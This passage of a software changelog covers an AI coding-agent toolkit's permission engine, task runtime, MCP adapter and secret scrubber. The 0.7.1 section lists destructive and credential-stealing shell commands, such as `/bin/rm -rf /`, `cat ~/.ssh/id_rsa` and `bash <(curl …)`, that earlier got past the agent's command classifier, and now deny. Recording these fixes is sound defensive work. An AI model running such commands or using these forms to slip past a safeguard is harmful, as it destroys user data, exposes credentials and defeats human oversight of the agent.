  `risk` ∈ {low, medium, high, critical}, options with default + suggested,
  optional preview (diff | text | table), optional deadline_ts.  Persists
  to `.vibecode/runtime/approvals/appr-<id>.json`; `wait()` auto-denies on
  timeout / deadline; `respond()` validates against declared options.
  CLI `vibe approval {list|create|respond|get}`.
- **All 7 task kinds wired** (`task_runtime.py`, Ch 7.2):
  `start_local_agent` spawns a sub-agent with role/objective and executes
  a block-plan; `start_local_workflow` runs a declarative pipeline with
  bash/sleep/write steps, `on_error: continue` support, and path-escape
  guard; `start_monitor_mcp` periodically calls an MCP tool and records
  up/down counts.  All writable by CLI: `vibe task {agent|workflow|monitor|dream}`.
- **Dream 4-phase with embedding dedup** (`task_runtime.start_dream`,
  §11.5): `orient` (count sessions) → `gather` (last 200 events per
  session) → `consolidate` (tool-usage + error digest to
  `.vibecode/memory/dream-digest.md`) → `prune` (greedy cosine-similarity
  dedup over `.vibecode/memory/*.jsonl` with threshold 0.92).  Writes a
  JSON-lines phase log to the task's output file.

### Added — Infrastructure & UX

- Bundled reference MCP server `vibecodekit.mcp_servers.selfcheck` with
  `ping` / `echo` / `now` tools so `vibe task monitor` and probes work
  out-of-the-box without an external binary.
- Three new slash-commands: `/vibe-memory`, `/vibe-approval`, `/vibe-task`
  (plugin-manifest bumped to 0.9.0; 15 commands total).
- **Six new behaviour probes** (audit 30 total, 100 % pass):
  25 `memory_hierarchy_3tier`, 26 `approval_contract_ui`,
  27 `all_seven_task_kinds`, 28 `dream_four_phase`,
  29 `mcp_stdio_roundtrip` (real subprocess),
  30 `structured_notifications` (no data loss under contention).
- Regression test-suite: **241 tests** (up from 210 in v0.8, 180 in v0.7.1).
  Covers every v0.8 bug fix + every v0.9 feature + MCP stdio round-trip.

### Changed

- `02_derived_needs_follow_up` probe switched from ledger-introspection
  (broken after per-turn reset fix) to a behavioural check on
  `turn_results[*].follow_ups`.
- `approval_contract.get()` now returns the request merged with its
  response (if any) under `"response"` — previously returned only the
  request.  No breaking change to `respond()` / `list_pending()`.
- SKILL.md, `.claw.json`, and plugin-manifest version bumped to 0.9.0.


## [0.8.0] — 2026-04-25 (Full Agentic OS)

v0.8 graduates VibecodeKit from a "production kit implementing 18
Claude-Code patterns" to a **Full Agentic OS** aligned with the six
subsystems Giải phẫu một Agentic Operating System calls out as
mandatory.  Every v0.7.1 P2 deferred item is also closed.

### Added — Six new subsystems (PDF parity)

- **Background-task runtime** (`task_runtime.py`, Giải phẫu Ch 7):
  7 task types (`local_bash`, `local_agent`, `remote_agent`,
  `in_process_teammate`, `local_workflow`, `monitor_mcp`, `dream`),
  5 lifecycle states (`pending → running → completed | failed | killed`),
  on-disk output with **outputOffset** incremental read (§7.4),
  notifications ledger, stall detection (≥ 45 s + interactive-prompt
  tail), dream memory-consolidation.  Coordinators can start/kill tasks;
  only builders can write files.
- **MCP client adapter** (`mcp_client.py`, Giải phẫu §2.8 / Ch 10):
  manifest-driven registry, `stdio` and `inproc` transports,
  `register` / `list` / `disable` / `call` API, exposed as CLI
  `vibe mcp …` and as tools `mcp_list` / `mcp_call`.
- **Cost / token accounting ledger** (`cost_ledger.py`, Giải phẫu §12.4):
  per-turn tokens, per-tool latency, per-model cost estimate in USD.
  Wired into `query_loop.run_plan()`; emitted as `cost_summary` event at
  plan end; accessible via `vibe ledger summary`.
- **26 lifecycle hook events** (`hook_interceptor.py`, Giải phẫu §10.3):
  Tool lifecycle (3), Permission (2), Session (3), Agent (3), Task (4),
  Context (3), Filesystem (4), UI/Config (5).  Legacy VibecodeKit events
  are still accepted for backward compatibility.
- **Follow-up re-execute loop** (`query_loop.py`, Pattern #2 / §3.6):
  `retry_same`, `retry_with_budget`, `compact_then_retry`,
  `safe_mode_retry` now actually re-run the turn (bounded by
  `DEFAULT_MAX_FOLLOW_UPS = 3`).  Previously these emitted events but
  did not loop.
- **Concurrency-safe denial store** (`denial_store.py`): all
  read-modify-write operations wrapped in `fcntl.flock(LOCK_EX)` +
  atomic `os.replace`.  Verified safe under 32 concurrent workers × 25
  denials each (no drops).

### Added — P2 deferred items from v0.7.1 self-review

- `read_file` now accepts `offset` and `length` parameters and returns
  `{offset, length, total_size, next_offset, eof, truncated, content}`.
  Matches Claude Code's `outputOffset` pattern (§7.4) so large files can
  be read incrementally without re-reading from start.
- Hook payload sanitiser: recursively scrubs dict keys matching
  `TOKEN|KEY|SECRET|PASSWORD|PASSWD|PRIVATE|CREDENTIAL` and free-form
  strings matching common token shapes (AWS `AKIA…` / `ASIA…`, OpenAI
  `sk-…`, GitHub `ghp_…` / `ghs_…` / `gho_…`, GitLab `glpat-…`, 40+ hex
  tokens, `Authorization: Bearer` / `Basic` headers, `--password`
  / `--token` / `--secret` flags).  Opt-out via
  `VIBECODE_HOOK_ALLOW_SECRETS=1`.
- Conformance audit now has **24 probes** (up from 18) covering the six
  new subsystems with behaviour-based assertions (not file-exists).

### Added — new tools

Tool executor registers:

- `task_start`, `task_status`, `task_read`, `task_kill`,
  `task_notifications`
- `mcp_list`, `mcp_call`

All correctly partitioned in `tool_schema_registry` (safe vs exclusive).
Sub-agent `PROFILES` updated: coordinators inherit `task_start`/`task_kill`
(orchestration) but not write/append/delete.

### Added — CLI subcommands

```
vibe task  {start|list|status|read|kill|dream|stalls}
vibe mcp   {list|register|disable|call}
vibe ledger {summary|reset}
```

### Added — references

- `references/19-background-tasks.md`
- `references/27-mcp-adapter.md`
- `references/28-cost-ledger.md`

### Changed

- `SKILL.md` version bumped to `0.8.0`; description now calls out "Full
  Agentic OS"; new triggers `/vibe-task`, `/vibe-mcp`, `/vibe-ledger`.
- `hook_interceptor._VALUE_SECRET_PATTERNS` restructured: entries are now
  `(regex, "prefix" | "whole")` to avoid the v0.7.1 bug where a capturing
  group that *was* the secret would be re-emitted alongside `***REDACTED***`.
- `query_loop.run_plan()` return value now includes a `cost` summary
  and each `turn_results[i]` includes `follow_ups`.

### Fixed

- v0.7.1 `_scrub_str` re-emitted AWS / GitHub / GitLab keys verbatim
  because the replacement lambda concatenated `group(1)` (the secret)
  with `***REDACTED***`.  Fixed.
- `query_loop` no longer forgets to write the cost summary when a plan
  ends via `user_decision_required`.

### Verified

- 210 pytest tests pass (Python 3.9 / 3.11 / 3.12)
- Conformance audit: 24/24 probes, 100 % parity
- End-to-end sample plan: `stop_reason=plan_exhausted`
- Denial store concurrency: 32 workers × 25 denials, 0 drops

## [0.7.1] — 2026-04-25 (self-review fixes)

### Fixed — permission bypasses found in self-review

- **`rm` flag combinations** — `rm -rfv`, `rm -Rfv`, `rm -fvr`,
  `rm --recursive --force` were all previously classified as `ask`
  because the regex only recognised compact flag orderings (`-rf`, `-fr`).
  The new regex accepts any flag permutation of `r/R` + `f/F` plus the
  long-form `--recursive` / `--force` combination.
- **Absolute-path invocations of rm** — `/bin/rm -rf /` bypassed the
  classifier because it didn't start with `rm `.  Fixed to recognise any
  absolute path ending in `/rm`.
- **Reading sensitive paths via safe read-only tools** — `cat /etc/passwd`,
  `ls /root`, `cat ~/.ssh/id_rsa`, `cat ~/.aws/credentials`,
  `cat ~/.bash_history`, `head /proc/self/environ`, and friends were all
  previously classified as `read_only → allow`.  Added a dedicated
  "sensitive system/user path" pattern that denies reads/writes to
  `/etc/{passwd,shadow,sudoers,gshadow,group,hosts}`, `/root/*`,
  `/proc/self/{environ,mem}`, and `~/.{bash_history,zsh_history,ssh/*,
  aws/credentials,docker/config.json,kube/config,netrc}`.
- **Writes to system paths via redirect / tee** — `echo x > /etc/passwd`,
  `>> /etc/hosts`, `tee /etc/shadow` now deny.
- **System-administration commands** — added explicit denials for
  `chown`/`chmod` on `/etc|/var|/usr|/root|/boot`, `mount`/`umount`,
  `iptables`, `systemctl {start,stop,restart,disable,mask,daemon-reload}`,
  `service <name> {start,stop,restart,reload}`, `killall`, `pkill`,
  `crontab -r`, `useradd`/`userdel`/`groupadd`/`groupdel`/`usermod`,
  `passwd`.
- **Symlink attacks into sensitive paths** — `ln -s /etc/passwd …`,
  `ln -s ~/.ssh/id_rsa …`, `ln -s ~/.aws/credentials …` now deny.
- **Archive extraction to `/`** — `tar -C /`, `bsdtar -C /`,
  `unzip -d /` now deny.
- **Command / process substitution wrapping network tools** —
  `$(curl …)`, `` `curl …` ``, `bash <(curl …)`, `<(wget …)` now deny
  even when the outer command is a classic read-only tool like `echo`.
- **Short-form `git push -f`** — previously only `--force` was matched;
  now both forms deny.

### Added

- `glob` tool implementation in `tool_executor.py`.  The tool was
  declared in `TOOLS` and in every role profile in v0.7.0 but had no
  implementation — calling it returned "unknown tool".
- `tests/test_glob_tool.py` — 5 tests covering glob matching, path
  escape, and the cross-check that every tool in `PROFILES` and `TOOLS`
  actually has a real implementation.
- `tests/test_permission_engine_v071_bypasses.py` — 74 parametrised
  regression cases for the bypasses above.

### Changed

- `install_manifest.plan()` now also copies `assets/plugin-manifest.json`
  and `runtime/sample-plan.json` so `vibe audit` still sees the manifest
  and `vibe run runtime/sample-plan.json` works from the installed
  location.
- `runtime/sample-plan.json` rewritten to use only paths that exist in
  any project after extraction (previously it read `SKILL.md` at the
  project root, which only exists inside the skill bundle, not in a
  user's project).
- `_probe_plugin_extension` in the conformance audit now searches both
  the skill-bundle and installed layouts for the plugin manifest.

### Test count

178/178 passing (was 105 in v0.7.0).

---

## [0.7.0] — 2026-04-25

### Context

v0.6 shipped a spec-heavy skill whose prototype implementation was only
~40–60 % faithful to its own specification (see
`VibecodeKit-v0.6-DeepReview.md`).  v0.7 is a **ground-up rewrite** of
the runtime that verifiably implements all 18 Claude Code patterns
documented in *Giải phẫu một Agentic Operating System* and the
companion interactive guide at <https://claude-code-from-source.com/>.

### Added

- **6-layer permission pipeline** (`permission_engine.py`) with 40+
  dangerous-pattern regexes spanning Kubernetes / Terraform / Docker /
  cloud CLIs (AWS/GCP/Azure) / SQL / shell injection / Zsh exploits /
  package managers / secrets / deploy platforms.
- **Denial-fatigue circuit breaker** and same-command repeat-denial
  fast-path with 24 h TTL (`denial_store.py`).
- **Path-safety** via `Path.resolve() + relative_to()` in every file tool
  (`tool_executor.py`); blocks symlink escape, `..`, and absolute-path
  writes outside the project root.
- **`read_file` truncation signal** (`truncated: bool`, `bytes`,
  `total_bytes`) so agents can handle oversized files without silent
  clipping.
- **`delete_file` always denied** in the default tool surface; operators
  who truly need to delete use `run_command` with explicit approval.
- **Coordinator role ACL** enforced in both `tool_executor.execute_one`
  and `subagent_runtime.run` (double-gate).
- **All 5 role cards** (coordinator / scout / builder / qa / security)
  now have real tool whitelists, `can_mutate` flags, and bubble
  escalation for child agents.
- **Full 7-step escalating recovery ladder** dispatched by the query
  loop (v0.6 only dispatched `terminal_error`).
- **Reactive compact (Layer 4)** and **context collapse (Layer 5)**
  produce real JSON artefacts at
  `.vibecode/runtime/reactive-compact.json` and
  `.vibecode/runtime/context-collapse.json`.
- **Vietnamese tokenizer**: NFC normalisation + diacritic stripping so
  `"phan tich"` matches `"phân tích"` in memory retrieval
  (`memory_retriever.py`).
- **Behaviour-based conformance audit** (`conformance_audit.py`): 18
  probes that exercise the real code paths instead of checking file
  existence.  Currently at **100 %** parity (18/18).
- **Pytest smoke suite** (`tests/`): 105 tests covering permission,
  tool-exec, path safety, hooks, sub-agent ACL, recovery, compaction,
  denial store, skill discovery, memory retrieval, conformance,
  install manifest, doctor, and query loop.
- **GitHub Actions CI** (`.github/workflows/ci.yml`): runs pytest on
  push / PR on Python 3.9 / 3.11 / 3.12.
- **Install manifest** (`install_manifest.py`, Pattern #16): hash-diff
  reconciliation install; never deletes.
- **Skill discovery** (`skill_discovery.py`): gitignore-aware, rejects
  `node_modules` and friends.
- **Quality gate** (`quality_gate.py`): 7 dimensions × 8 axes → PASS/FAIL
  with per-axis justification.
- **Hook interceptor** now passes the command on `argv[1]` AND
  `$VIBECODE_HOOK_COMMAND`, accepts structured JSON returns (`decision`,
  `reason`, `banner`, …), and strips secrets from the subprocess env by
  default.
- **Reference documentation** (`references/00-overview.md` … `26-quality-gates.md`)
  with concrete definitions for the 5 RRI personas, SVPFI handoff
  envelope, the 7 UX/UI dimensions, the 8 verification axes, and the
  permission matrix.

### Changed

- Permission denial threshold raised from `≥ 1` to `≥ 2` with a 24 h TTL
  to prevent permission fatigue (users were hitting deny on every retry
  of legitimate commands).
- Event bus consolidated into a single schema (`vibe.events/1`) — v0.6
  shipped three different formats (`async_query_runner`,
  `streaming_tool_executor`, `event_bus`).
- Dashboard reads from the single event bus; v0.6 had two independent
  implementations (`dashboard_v5.py`, `dashboard_v6.py`).
- Conformance audit moved from tautological file-existence checks to
  real behaviour-based probes (v0.6 was fixed at 100 % regardless of
  actual conformance).
- `pre_tool_guard.sh` (dead code in v0.6 — never received the command)
  replaced with `pre_tool_use.py` that imports the real
  `permission_engine`.
- `SKILL.md` frontmatter now includes `version`, `triggers`, `paths`,
  `requires`, `allowed-tools`, `hooks` per the Claude Code skill schema.

### Fixed

- **P0** — permission regex: added kubectl delete/rollout/drain,
  terraform apply/destroy/taint, docker prune/volume rm, aws s3 rb,
  `dd`, `mkfs`, `shred`, `DROP TABLE`, force-delete flags, npm/yarn/pnpm
  install, curl|bash pipe, eval, sudo, git --force, git reset --hard,
  git clean -fdx, git filter-branch, zsh `=(...)` and heredoc exploits,
  ssh private keys, ~/.aws/credentials.
- **P0** — permission regex false positives: `.env.example`,
  `.env.sample`, `.env.dist`, `.env.template` are no longer blocked;
  `env FOO=1 cmd` no longer matches the `.env` file rule.
- **P0** — permission modes `bubble`, `auto`, `accept_edits` now execute
  their real semantics (v0.6 all fell through to `default`).
- **P0** — sub-agent profile `tools` and `can_mutate` are enforced at
  the tool dispatcher (v0.6 ignored both).
- **P0** — `query_loop` now dispatches all 7 recovery levels, not just
  `terminal_error`.
- **P0** — compaction Layers 4 and 5 are real (produce on-disk
  artefacts) instead of 6-line JSON placeholders.
- **P0** — path escape via `..` / symlink / absolute path is rejected
  with a structured error.
- **P0** — removed duplicate v0.5 runtime files, `__pycache__` folders,
  and development-session artefacts from the ship bundle.

### Removed

- `scripts/*_v5.py` and `scripts/*_v6.py` duplicates (single source of
  truth now).
- `pre_tool_guard.sh` dead code.
- Session `.jsonl` files accidentally included in the v0.6 update
  package.

### Migration

No external migration guide — see breaking changes listed above for upgrade steps.

---

## [0.6.0] — 2026-03-14

- Initial public release.  See `VibecodeKit-Hybrid-Ultra-v0.6-Spec.md`.
